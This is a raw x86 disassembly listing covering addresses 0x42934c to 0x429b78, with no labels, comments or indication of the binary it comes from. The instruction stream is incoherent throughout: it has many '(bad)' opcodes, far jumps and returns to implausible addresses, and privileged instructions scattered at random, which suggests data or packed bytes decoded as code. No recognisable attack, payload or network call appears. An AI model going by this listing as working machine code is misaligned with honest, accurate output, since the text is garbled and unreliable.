  42934c:	pop    es
  42934d:	mov    ch,0x33
  42934f:	dec    ebx
  429351:	(bad)  
  429352:	mov    eax,0x72009ea4
  429357:	push   DWORD PTR [edx]
  429359:	or     BYTE PTR [eax],al
  42935b:	jmp    0xff89:0x75c84d03
  429362:	dec    ebp
  429363:	loopne 0x429335
  429365:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  42936b:	add    BYTE PTR [ebx],dh
  42936d:	mov    ecx,ebx
  42936f:	hlt    
  429370:	add    ecx,ebx
  429372:	enter  0x899e,0x32
  429376:	dec    ebp
  429377:	add    ecx,eax
  429379:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  42937f:	or     DWORD PTR [ebx-0xb00b29c],0x0
  429386:	xor    ecx,ebx
  429388:	retf   
  429389:	enter  0x4d03,0xc8
  42938d:	mov    DWORD PTR fs:[eax],ebx
  429390:	lea    eax,[eax]
  429392:	push   esp
  429393:	mov    edi,edi
  429395:	fs (bad) 
  429397:	(bad)  
  429398:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  42939e:	push   0xffffffff
  4293a0:	and    bh,bh
  4293a2:	pop    ecx
  4293a3:	inc    eax
  4293a4:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4293aa:	push   0xffffff8b
  4293ac:	pop    ecx
  4293ad:	cld    
  4293ae:	dec    ebp
  4293af:	lea    ecx,[ecx+0x45ff08ff]
  4293b5:	mov    BYTE PTR [edx+0x1],cl
  4293b8:	add    BYTE PTR [eax],al
  4293ba:	mov    DWORD PTR [ebp+0x8],0x58008d
  4293c1:	dec    DWORD PTR [ebp-0x77]
  4293c4:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4293cb:	cld    
  4293cc:	dec    ebp
  4293cd:	jne    0x429402
  4293cf:	lea    eax,[ebx]
  4293d1:	push   eax
  4293d2:	mov    edi,edi
  4293d4:	or     BYTE PTR [ecx+0x54a845],cl
  4293da:	add    al,ch
  4293dc:	(bad)  
  4293dd:	sub    esp,ebp
  4293df:	add    BYTE PTR [eax],al
  4293e1:	rol    BYTE PTR [eax],0x84
  4293e4:	inc    ebp
  4293e5:	add    dh,BYTE PTR [esi+0x0]
  4293e8:	add    BYTE PTR [ebp-0x73],al
  4293eb:	mov    ebp,DWORD PTR [esp+edx*4]
  4293ee:	inc    DWORD PTR [eax]
  4293f0:	lea    ecx,[ebx-0x30074f4]
  4293f6:	call   0x439f7b
  4293fb:	add    BYTE PTR [ebp+0x0],cl
  4293fe:	jne    0x429441
  429400:	dec    DWORD PTR [ebx-0x76210314]
  429406:	dec    ebp
  429407:	add    DWORD PTR [ebp+0x0],esi
  42940a:	(bad)  
  42940b:	xchg   ebp,eax
  42940c:	loopne 0x42940d
  42940e:	inc    eax
  42940f:	inc    DWORD PTR [eax]
  429411:	mov    ecx,DWORD PTR [ebp-0x4]
  429414:	xor    edx,DWORD PTR [edx+0x7201b8]
  42941a:	add    BYTE PTR [edx],dl
  42941c:	enter  0x4d90,0x0
  429420:	mov    eax,DWORD PTR [eax]
  429422:	hlt    
  429423:	add    al,0xa5
  429425:	mov    al,0xff
  429427:	add    bh,bh
  429429:	add    BYTE PTR [ebx],dh
  42942b:	inc    DWORD PTR [ebx]
  42942d:	sbb    al,0x89
  42942f:	jne    0x429409
  429431:	mov    esp,DWORD PTR [ecx+0x4500fc]
  429437:	mov    eax,DWORD PTR [ebp-0xff0048]
  42943d:	mov    DWORD PTR [eax-0x70],0xee58e189
  429444:	inc    DWORD PTR [ebp-0x75]
  429447:	ror    DWORD PTR [esp+ebp*8],1
  42944a:	test   DWORD PTR [esi-0x1],esp
  42944d:	inc    ebp
  42944e:	(bad)  
  42944f:	aas    
  429450:	inc    ebp
  429451:	(bad)  
  429452:	lea    edi,[esp+eiz*2-0x1]
  429456:	push   DWORD PTR [edi]
  429458:	mov    DWORD PTR [ecx],esi
  42945a:	mov    al,ds:0x8b8000c7
  42945f:	out    dx,al
  429460:	cld    
  429461:	call   0xed41d9f3
  429466:	(bad)  
  429467:	fisttp WORD PTR [eax+0x8801c7]
  42946d:	jmp    0x4294b4
  42946f:	out    dx,al
  429470:	inc    DWORD PTR [ebp-0x4]
  429473:	xlat   BYTE PTR ds:[ebx]
  429474:	lea    edi,[edi]
  429476:	inc    edi
  429478:	jmp    FWORD PTR [eax-0x78]
  42947b:	inc    DWORD PTR [ecx]
  42947d:	aaa    
  42947e:	add    BYTE PTR [ecx],dh
  429480:	repnz mov DWORD PTR [eax],0xfff856c
  429487:	ffreep st(5)
  429489:	aas    
  42948a:	add    bh,al
  42948c:	mov    esi,DWORD PTR [eax-0x4]
  42948f:	inc    DWORD PTR [eax+0xdf01ec]
  429495:	(bad)  
  429496:	or     BYTE PTR [ebp+eax*2-0x1],dh
  42949a:	mov    esp,ebx
  42949c:	xchg   esp,eax
  42949d:	rol    DWORD PTR [eax],cl
  42949f:	(bad)  
  4294a0:	mov    edi,DWORD PTR [eax+0x3]
  4294a3:	(bad)  
  4294a4:	cmp    al,0xd7
  4294a6:	dec    ebp
  4294a7:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  4294ad:	add    BYTE PTR [ebp-0x3b375],cl
  4294b3:	adc    BYTE PTR [edx+0x1],0x55
  4294b7:	add    BYTE PTR [ebx+0x58c30],cl
  4294bd:	add    BYTE PTR [ebx-0x778afc7b],cl
  4294c3:	mov    eax,DWORD PTR [eax]
  4294c5:	cld    
  4294c6:	push   0x7d
  4294c8:	dec    DWORD PTR [ebx+0xd88c]
  4294ce:	push   edx
  4294cf:	mov    edx,DWORD PTR [ecx-0x4]
  4294d2:	call   DWORD PTR [eax+0x7d01fc]
  4294d8:	mov    esp,DWORD PTR [esp+edi*8]
  4294db:	add    BYTE PTR [eax+0x560150],dl
  4294e1:	test   DWORD PTR [ebp+0x75],eax
  4294e4:	call   0xc83f7574
  4294e9:	jge    0x42947f
  4294eb:	mov    ebp,ebx
  4294ed:	fcom   st(7)
  4294ef:	add    bh,al
  4294f1:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  4294f7:	add    edi,edi
  4294f9:	add    bh,bh
  4294fb:	add    ah,cl
  4294fd:	add    ah,dl
  4294ff:	push   eax
  429500:	inc    ebp
  429501:	push   esi
  429502:	fisttp WORD PTR [ebx+0x4dc7f43f]
  429508:	test   BYTE PTR [ebx],dh
  42950a:	aam    0x5
  42950c:	retf   0x4572
  42950f:	add    bl,ah
  429511:	rcl    ebx,0x84
  429514:	mov    DWORD PTR [ecx],0x46d1008c
  42951a:	jl     0x42951c
  42951c:	test   edi,eax
  42951e:	jmp    esp
  429520:	inc    DWORD PTR [eax]
  429522:	loope  0x429524
  429524:	aam    0x75
  429526:	test   DWORD PTR [ebx+0x45fffcff],ecx
  42952c:	out    dx,al
  42952d:	mov    ebp,eax
  42952f:	mov    ah,0x85
  429531:	add    bh,bh
  429533:	call   0x116be37
  429538:	retf   0x858b
  42953b:	cld    
  42953c:	inc    DWORD PTR [eax+0xeb01ff]
  429542:	out    dx,al
  429543:	xor    BYTE PTR [ebp-0xff0085],al
  429549:	mov    edx,ecx
  42954b:	cld    
  42954c:	jl     0x4294d7
  42954e:	push   ebx
  42954f:	add    DWORD PTR [eax],eax
  429551:	add    BYTE PTR [eax+0x1],dl
  429554:	inc    ebp
  429555:	inc    ebp
  429556:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  42955c:	dec    DWORD PTR [ebx-0x3fd90318]
  429562:	add    BYTE PTR [ebp-0xbf0040],dl
  429568:	inc    ebp
  429569:	retf   0x8b
  42956c:	cld    
  42956d:	push   eax
  42956e:	mov    al,0x45
  429570:	add    DWORD PTR [ebx+0x459c00],ecx
  429576:	mov    edi,edi
  429578:	mov    eax,0xe80800ff
  42957d:	inc    ebp
  42957e:	sub    DWORD PTR [ebx-0x47000400],ecx
  429584:	add    al,0x1
  429586:	rol    BYTE PTR [eax],0x1e
  429589:	jne    0x4295d0
  42958b:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  429591:	inc    DWORD PTR [ecx]
  429593:	call   0x87bd98
  429598:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  42959e:	call   0x42bea4
  4295a3:	xor    bh,bh
  4295a5:	push   edi
  4295a6:	adc    BYTE PTR [ebx-0x747423bb],al
  4295ac:	loopne 0x42958a
  4295ae:	ret    
  4295af:	loopne 0x42954f
  4295b1:	xor    DWORD PTR [edx],0x31
  4295b4:	cmp    edi,edi
  4295b6:	bswap  esp
  4295b8:	rol    BYTE PTR gs:[eax],0x5
  4295bc:	jmp    0x12d9706
  4295c1:	mov    eax,DWORD PTR [ebp-0x4]
  4295c4:	add    BYTE PTR [eax+0xff0100],bh
  4295ca:	cld    
  4295cb:	jne    0x42964a
  4295cd:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4295d3:	pusha  
  4295d4:	add    DWORD PTR [eax],eax
  4295d6:	add    BYTE PTR [eax-0x37],dl
  4295d9:	inc    ebp
  4295da:	add    BYTE PTR [ebx+0x459850],cl
  4295e0:	mov    edi,edi
  4295e2:	test   al,0xff
  4295e4:	add    BYTE PTR [eax],cl
  4295e6:	inc    DWORD PTR [ebp-0x18]
  4295e9:	jmp    DWORD PTR ds:0x4d7d00dc
  4295ef:	adc    BYTE PTR [ebx+0x459cb9],cl
  4295f5:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4295fb:	sahf   
  4295fc:	mov    eax,0x30132
  429601:	lea    esi,[ebp+0x2c]
  429604:	xor    edi,edi
  429606:	(bad)  
  429607:	call   0x141be74
  42960c:	call   0x136be9c
  429611:	jne    0x42959e
  429613:	xor    edi,esp
  429615:	add    eax,DWORD PTR [eax+0xc018d]
  42961b:	push   DWORD PTR [eax]
  42961d:	call   0xcbbe79
  429622:	int3   
  429623:	inc    DWORD PTR [ebp-0x14]
  429626:	mov    ecx,DWORD PTR [ebp-0x28]
  429629:	xor    eax,DWORD PTR [eax]
  42962b:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  429631:	(bad)  
  429632:	xchg   ebp,eax
  429633:	in     al,0xff
  429635:	add    bh,bh
  429637:	add    BYTE PTR [edi+0x508b0045],bl
  42963d:	or     BYTE PTR [ebp-0x3d],al
  429640:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  429647:	mov    edi,edi
  429649:	or     BYTE PTR [eax],cl
  42964b:	inc    ebp
  42964c:	test   DWORD PTR gs:[eax],eax
  42964f:	je     0x429696
  429651:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  429657:	xor    edx,DWORD PTR [eax-0x73]
  42965a:	push   ebp
  42965b:	or     BYTE PTR [ebp+0x21007572],al
  429661:	inc    ebp
  429662:	in     al,dx
  429663:	mov    ebp,DWORD PTR [eax]
  429665:	mov    esp,0x628bc345
  42966a:	fmul   st,st(5)
  42966c:	add    BYTE PTR [ebx],ch
  42966e:	mov    eax,DWORD PTR [ebx]
  429670:	cld    
  429671:	loopne 0x429633
  429673:	inc    ebp
  429674:	push   ebp
  429675:	cmp    ebp,eax
  429677:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  42967e:	cld    
  42967f:	fadd   DWORD PTR [eax+0x3b014d]
  429685:	jne    0x4296b7
  429687:	push   0xf8898557
  42968c:	in     al,dx
  42968d:	jne    0x4296d4
  42968f:	lea    eax,[ebx+0x72e8dcc8]
  429695:	xor    BYTE PTR [ebx+0x7545bc00],cl
  42969b:	jmp    0x4296d0
  42969d:	mov    edi,DWORD PTR [edi+0x4572bc]
  4296a3:	xor    eax,edi
  4296a5:	adc    DWORD PTR [ebp-0xcd0062],0x8b2b31
  4296af:	rcl    BYTE PTR [eax-0x40],1
  4296b2:	inc    ebp
  4296b3:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4296bb:	inc    ebp
  4296bc:	xchg   ebp,eax
  4296bd:	ud0    ebp,DWORD PTR [ebx]
  4296c0:	inc    DWORD PTR [eax]
  4296c2:	adc    eax,0x508a0076
  4296c7:	adc    BYTE PTR [ebp+0x1f],0x8b
  4296cb:	or     al,0xf4
  4296cd:	inc    eax
  4296ce:	retf   
  4296cf:	inc    ebp
  4296d0:	iret   
  4296d1:	jb     0x42969b
  4296d3:	mov    eax,DWORD PTR [edi]
  4296d5:	enter  0x4545,0x1
  4296d9:	xor    eax,0x898b9c00
  4296de:	mov    esp,0x33344df0
  4296e3:	pushf  
  4296e4:	lea    ecx,[ecx+0x4d72e008]
  4296ea:	add    BYTE PTR [ebx],dh
  4296ec:	inc    ebp
  4296ed:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  4296f3:	xor    dl,BYTE PTR [edx]
  4296f5:	add    eax,DWORD PTR [ebp-0x77]
  4296f8:	mov    eax,esp
  4296fa:	fmul   DWORD PTR [ebp-0x3d]
  4296fd:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  429704:	mov    DWORD PTR [ebp-0x28],eax
  429707:	aad    0x45
  429709:	pushf  
  42970a:	xor    eax,edi
  42970c:	mov    ecx,0xff858db0
  429711:	clc    
  429712:	enter  0x4d45,0x32
  429716:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  42971d:	test   esi,edi
  42971f:	clc    
  429720:	inc    DWORD PTR [ebp+0x45]
  429723:	xor    BYTE PTR [ebx-0x3738f764],cl
  429729:	test   al,0x16
  42972b:	test   DWORD PTR ds:0xff459cf8,esi
  429731:	ds cld 
  429733:	pushf  
  429734:	inc    ebp
  429735:	mov    edx,DWORD PTR [eax-0x28]
  429738:	popf   
  429739:	push   ebp
  42973a:	add    BYTE PTR [ebx],dh
  42973c:	mov    DWORD PTR [ebx],eax
  42973e:	sar    BYTE PTR [ebx],1
  429740:	adc    BYTE PTR [edi],cl
  429742:	dec    ebp
  429743:	adc    al,0x8b
  429745:	add    al,dl
  429747:	jmp    0x1039917
  42974c:	jb     0x42979b
  42974e:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  429754:	xor    ecx,DWORD PTR [ebp+0x3b]
  429757:	xor    ecx,DWORD PTR [edi]
  429759:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  42975d:	(bad)  
  42975f:	clc    
  429760:	enter  0x8400,0x8b
  429764:	pop    es
  429765:	mov    al,0x0
  429767:	push   ebp
  429768:	push   cs
  429769:	xor    ecx,eax
  42976b:	xor    esp,ecx
  42976d:	add    ebp,DWORD PTR [eax]
  42976f:	add    esi,DWORD PTR [eax]
  429771:	(bad)  
  429773:	retf   0x55c8
  429776:	repnz mov eax,DWORD PTR [ebp-0x10]
  42977a:	(bad)  
  42977b:	cli    
  42977c:	fdivr  st,st(1)
  42977e:	test   DWORD PTR [eax+edi*8],ecx
  429781:	dec    ebp
  429782:	inc    ebp
  429783:	xor    edi,DWORD PTR [eax-0x7167afd]
  429789:	add    BYTE PTR [ebp+0x0],al
  42978c:	mov    ecx,DWORD PTR [ebp-0x28]
  42978f:	mov    ecx,ebx
  429791:	clc    
  429792:	jne    0x42975f
  429794:	mov    esi,0xd672d3
  429799:	into   
  42979a:	into   
  42979b:	scas   eax,DWORD PTR es:[edi]
  42979c:	dec    ebp
  42979d:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4297a3:	sub    ecx,esi
  4297a5:	cmp    ecx,DWORD PTR [ebp+0x77]
  4297a8:	(bad)  
  4297a9:	mov    edi,eax
  4297ab:	mov    al,0x85
  4297ad:	mov    eax,edi
  4297af:	add    BYTE PTR [ebp-0x75],al
  4297b2:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4297b9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4297bf:	rdtsc  
  4297c1:	retf   0x559c
  4297c4:	(bad)  
  4297c5:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4297cc:	inc    ebp
  4297cd:	add    eax,0xeb9c4d3f
  4297d2:	(bad)  
  4297d3:	mov    ecx,esp
  4297d5:	lods   al,BYTE PTR ds:[esi]
  4297d6:	test   DWORD PTR [ebp-0x8],edx
  4297d9:	xor    ecx,DWORD PTR [ebp+0x33]
  4297dc:	mov    eax,DWORD PTR [ebx]
  4297de:	lock add ecx,ebx
  4297e1:	bswap  esi
  4297e3:	retf   0x55d1
  4297e6:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4297ec:	jmp    0x4297e7
  4297ee:	add    BYTE PTR ds:0xebc44d8b,al
  4297f4:	push   ebp
  4297f5:	mov    ebp,DWORD PTR [ebx]
  4297f7:	test   al,0x8b
  4297f9:	push   ebp
  4297fa:	clc    
  4297fb:	xor    ecx,ebx
  4297fd:	xor    ecx,esi
  4297ff:	add    edx,ecx
  429801:	add    eax,DWORD PTR [edx+0xca010f]
  429807:	push   ebp
  429808:	dec    ebp
  429809:	mov    ecx,DWORD PTR [ebx-0x34050710]
  42980f:	stc    
  429810:	rol    DWORD PTR ds:0xebce4dd6,cl
  429816:	scas   eax,DWORD PTR es:[edi]
  429817:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  42981d:	xor    ebp,DWORD PTR [ebx]
  42981f:	xor    edi,DWORD PTR [ebx]
  429821:	add    esi,DWORD PTR [edi+0x3]
  429824:	mov    ecx,DWORD PTR [edi]
  429826:	clc    
  429827:	retf   0x55cb
  42982a:	into   
  42982b:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  429832:	mov    eax,0x3376554d
  429837:	mov    esi,DWORD PTR [ebx]
  429839:	int3   
  42983a:	add    edx,DWORD PTR [ebp+0x3]
  42983d:	xor    ecx,DWORD PTR [edi]
  42983f:	xor    ecx,edx
  429841:	add    edx,DWORD PTR [ebp+0x3]
  429844:	mov    ecx,DWORD PTR [edi]
  429846:	lock retf 0x4dfa
  42984a:	stc    
  42984b:	mov    ecx,DWORD PTR [eax]
  42984d:	or     BYTE PTR [ebp+0x4d],cl
  429850:	jmp    0x10698e0
  429855:	dec    ebp
  429856:	dec    ebp
  429857:	(bad)  
  429858:	mov    ebx,esp
  42985a:	clc    
  42985b:	test   ebx,ecx
  42985d:	clc    
  42985e:	ror    DWORD PTR [ebp-0x2a],cl
  429861:	mov    esi,ecx
  429863:	call   0x33cdde17
  429868:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  42986f:	retf   
  429870:	ja     0x429840
  429872:	mov    ebp,DWORD PTR [eax-0x48]
  429875:	dec    ebp
  429876:	xor    ecx,DWORD PTR [di+0x3]
  42987a:	mov    esp,esp
  42987c:	clc    
  42987d:	push   ebp
  42987e:	retf   
  42987f:	mov    dl,bl
  429881:	adc    esi,edx
  429883:	jb     0x429853
  429885:	add    BYTE PTR [edi-0x3b7474b3],ch
  42988b:	call   0x4d6e640d
  429890:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  429896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429897:	sahf   
  429898:	inc    ebp
  429899:	xor    cl,BYTE PTR [ebp-0x78]
  42989c:	mov    edx,edi
  42989e:	clc    
  42989f:	dec    ebp
  4298a0:	retf   
  4298a1:	mov    edx,ebx
  4298a3:	call   0x56116c7e
  4298a8:	scas   eax,DWORD PTR es:[edi]
  4298a9:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4298af:	sahf   
  4298b0:	sub    esi,DWORD PTR [edx]
  4298b2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4298b8:	lods   al,BYTE PTR ds:[esi]
  4298b9:	xor    esp,DWORD PTR [ebx]
  4298bb:	add    ecx,DWORD PTR [ebp-0x1c]
  4298be:	mov    edi,DWORD PTR [ebp-0x8]
  4298c1:	mov    bl,cl
  4298c3:	cmp    dl,bl
  4298c5:	jb     0x429895
  4298c7:	add    dh,dl
  4298c9:	dec    ebp
  4298ca:	scas   eax,DWORD PTR es:[edi]
  4298cb:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4298d1:	shr    DWORD PTR [ebx],cl
  4298d3:	into   
  4298d4:	cmp    edx,esi
  4298d6:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4298dc:	dec    ebp
  4298dd:	dec    ebp
  4298de:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4298e4:	retf   
  4298e5:	xor    edx,esi
  4298e7:	add    ecx,esi
  4298e9:	imul   ecx,edx
  4298ec:	mov    DWORD PTR [ebp+0x8],edx
  4298ef:	xor    ecx,DWORD PTR [ebp+0x2b]
  4298f2:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  4298f8:	add    esi,DWORD PTR [ebx]
  4298fa:	mov    ah,0x3
  4298fc:	inc    ebp
  4298fd:	sysexit 
  4298ff:	xlat   BYTE PTR ds:[ebx]
  429900:	pushf  
  429901:	jge    0x42988c
  429903:	xor    ebx,eax
  429905:	sub    eax,DWORD PTR [ebp-0x73]
  429908:	(bad)  
  429909:	cmp    al,al
  42990b:	jb     0x429892
  42990d:	add    al,bh
  42990f:	ror    DWORD PTR [ebp-0x7a],1
  429912:	xor    edi,edi
  429914:	add    edi,edi
  429916:	jmp    0x429965
  429918:	mov    ecx,DWORD PTR [ebx-0x34341324]
  42991e:	dec    ebp
  42991f:	into   
  429920:	mov    ebp,DWORD PTR [edi-0x23737428]
  429926:	sahf   
  429927:	shl    DWORD PTR [edx],cl
  429929:	retf   0x5588
  42992c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429932:	add    eax,DWORD PTR [eax]
  429934:	in     al,0x4d
  429936:	push   ebp
  429937:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  42993d:	bound  eax,QWORD PTR [eax]
  42993f:	int    0x4d
  429941:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  429947:	dec    ebp
  429948:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  42994e:	jge    0x42991e
  429950:	mov    BYTE PTR [edi+0xf723b3a],ch
  429956:	add    cl,dh
  429958:	dec    ebp
  429959:	dec    DWORD PTR [ebx-0x2c032375]
  42995f:	adc    BYTE PTR [ebp+0x1],0x8b
  429963:	add    al,bl
  429965:	jge    0x4298f3
  429967:	push   0xffffff9e
  429969:	push   0x8b3032
  42996e:	shl    BYTE PTR [ebp+0x55],0x6a
  429972:	xor    edi,edi
  429974:	xor    edx,DWORD PTR [ebx+eax*1]
  429977:	inc    ebp
  429978:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  42997e:	dec    ebp
  42997f:	or     BYTE PTR [ecx+0x4dc8e483],cl
  429985:	jbe    0x429912
  429987:	mov    ebp,esp
  429989:	ror    bl,1
  42998b:	enter  0x14ce,0xaf
  42998f:	dec    DWORD PTR [ebx-0x2cef17f8]
  429995:	push   ebp
  429996:	retf   0x5540
  429999:	push   ebp
  42999a:	mov    esi,DWORD PTR [edx-0x1c]
  42999d:	mov    edx,ebx
  42999f:	cld    
  4299a0:	(bad)  
  4299a1:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4299a8:	sti    
  4299a9:	add    dh,cl
  4299ab:	push   0xffffff94
  4299ad:	call   FWORD PTR [esi+0x3b5032d0]
  4299b3:	mov    ecx,DWORD PTR [edi]
  4299b5:	int3   
  4299b6:	pop    esi
  4299b7:	inc    ebp
  4299b8:	dec    DWORD PTR [ecx+0x45e8c88b]
  4299be:	push   ebp
  4299bf:	xor    esi,DWORD PTR [ebx]
  4299c1:	mov    DWORD PTR [ebx],0xcacc0f9c
  4299c7:	aas    
  4299c8:	push   ebp
  4299c9:	inc    ebp
  4299ca:	xor    eax,esp
  4299cc:	add    eax,esp
  4299ce:	mov    eax,DWORD PTR [ebx]
  4299d0:	(bad)  
  4299d1:	jmp    0x42995f
  4299d3:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  4299d9:	rol    ah,1
  4299db:	mov    esi,0xf133104d
  4299e0:	mov    edx,0xff358d80
  4299e5:	mov    dh,0xd1
  4299e7:	cmp    edx,DWORD PTR [ebp+0xf]
  4299ea:	mov    eax,DWORD PTR [edx-0x20]
  4299ed:	add    BYTE PTR [ebp-0x75],bh
  4299f0:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4299f7:	sahf   
  4299f8:	retf   0x8632
  4299fb:	cmp    ebp,0x8
  4299fe:	call   ebx
  429a00:	inc    ebp
  429a01:	inc    ebp
  429a02:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  429a08:	mov    esi,DWORD PTR ds:0xc7049cc8
  429a0e:	add    al,al
  429a10:	add    bl,al
  429a12:	(bad)  
  429a13:	clc    
  429a14:	enter  0x45,0x35
  429a18:	push   eax
  429a19:	pushf  
  429a1a:	mov    edi,eax
  429a1c:	int3   
  429a1d:	or     al,al
  429a1f:	test   DWORD PTR [edi],edi
  429a21:	clc    
  429a22:	gs inc ebp
  429a24:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  429a2a:	push   ss
  429a2b:	xor    ecx,DWORD PTR [ebp+0x3]
  429a2e:	sub    edx,DWORD PTR [ecx-0x76]
  429a31:	dec    ebp
  429a32:	add    DWORD PTR [ebx+0x88d845],ecx
  429a38:	mov    esi,DWORD PTR [ebx]
  429a3a:	or     BYTE PTR [ebx],al
  429a3c:	cmp    edx,DWORD PTR [ecx-0x38]
  429a3f:	dec    ebp
  429a40:	out    dx,eax
  429a41:	xor    eax,DWORD PTR [ebp+0x3]
  429a44:	mov    edx,DWORD PTR [ecx-0x28]
  429a47:	dec    ebp
  429a48:	add    BYTE PTR [ebx],dh
  429a4a:	push   0x518003
  429a4f:	push   eax
  429a50:	add    BYTE PTR [ebx-0x300748b],cl
  429a56:	sbb    BYTE PTR [ebp+0x45],cl
  429a59:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  429a5f:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  429a65:	dec    ebp
  429a66:	inc    ebp
  429a67:	xor    eax,esp
  429a69:	add    eax,esp
  429a6b:	push   ecx
  429a6c:	(bad)  
  429a6d:	dec    ebp
  429a6e:	mov    al,ds:0xc9e031ff
  429a73:	retf   
  429a74:	(bad)  
  429a75:	into   
  429a76:	sub    bh,bh
  429a78:	dec    esp
  429a79:	adc    al,0x9c
  429a7b:	inc    ebp
  429a7c:	push   ebp
  429a7d:	test   DWORD PTR [edi],ecx
  429a7f:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  429a86:	jmp    0xc9bba99a
  429a8b:	add    cl,dl
  429a8d:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  429a97:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  429a9d:	rol    BYTE PTR [eax],0x57
  429aa0:	clc    
  429aa1:	bound  esi,QWORD PTR [edx+0x7]
  429aa4:	mov    eax,DWORD PTR [ebp-0x30]
  429aa7:	xor    al,0x40
  429aa9:	sub    al,0xc7
  429aab:	mov    ah,ch
  429aad:	add    DWORD PTR [ebp+0x4534f845],eax
  429ab3:	sub    al,0x86
  429ab5:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  429abc:	mov    ch,0xff
  429abe:	clc    
  429abf:	add    DWORD PTR [ebp+0x60],0x31
  429ac3:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  429aca:	inc    ebp
  429acb:	dec    DWORD PTR [ebx-0x341ff701]
  429ad1:	test   esi,ecx
  429ad3:	dec    DWORD PTR [ebx-0x7f8a3301]
  429ad9:	push   eax
  429ada:	add    DWORD PTR [ebp+0x0],eax
  429add:	dec    ebx
  429adf:	or     al,0xce
  429ae1:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  429ae8:	into   
  429ae9:	add    BYTE PTR [ebx-0x34ff1400],cl
  429aef:	mov    esi,ecx
  429af1:	sar    bh,0x45
  429af4:	adc    al,0x8b
  429af6:	clc    
  429af7:	fadd   DWORD PTR [ebp+0x0]
  429afa:	mov    ebp,DWORD PTR [edx+0x8]
  429afd:	push   edi
  429afe:	adc    BYTE PTR [eax+0x1],0x83
  429b02:	add    al,al
  429b04:	retf   
  429b05:	mov    ecx,esi
  429b07:	cld    
  429b08:	mov    eax,DWORD PTR [eax+0xcb01cc]
  429b0e:	into   
  429b0f:	add    BYTE PTR [ebx+0x756aec00],cl
  429b15:	jne    0x429b4a
  429b17:	inc    DWORD PTR [ebx]
  429b19:	rcl    BYTE PTR [ecx+0x50],1
  429b1c:	push   eax
  429b1d:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  429b23:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  429b2a:	sar    bh,0x84
  429b2d:	or     BYTE PTR [ebx],al
  429b2f:	push   eax
  429b30:	add    BYTE PTR [ebx+0x4532c845],cl
  429b36:	pushf  
  429b37:	xor    eax,0x89b49cc7
  429b3c:	test   eax,ebp
  429b3e:	clc    
  429b3f:	inc    ebp
  429b40:	inc    ebp
  429b41:	mov    DWORD PTR [eax+eax*8],esi
  429b44:	sub    al,0x34
  429b46:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  429b4d:	dec    ebp
  429b4e:	bound  esi,QWORD PTR [ebx]
  429b50:	inc    edi
  429b51:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  429b57:	dec    ebp
  429b58:	bound  esi,QWORD PTR [ebx]
  429b5a:	inc    edi
  429b5b:	add    eax,DWORD PTR [ebx-0xf7a377]
  429b61:	inc    ebp
  429b62:	add    ch,dl
  429b64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b65:	pushf  
  429b66:	inc    edi
  429b68:	dec    esp
  429b6a:	lea    eax,[ebp+0x45fff860]
  429b70:	push   eax
  429b71:	xor    dh,BYTE PTR [ebp-0x64]
  429b74:	(bad)  
  429b75:	(bad)  
  429b76:	pop    esp
  429b77:	lods   al,BYTE PTR ds:[esi]
  429b78:	inc    DWORD PTR [ebp+0x4508f8ff]
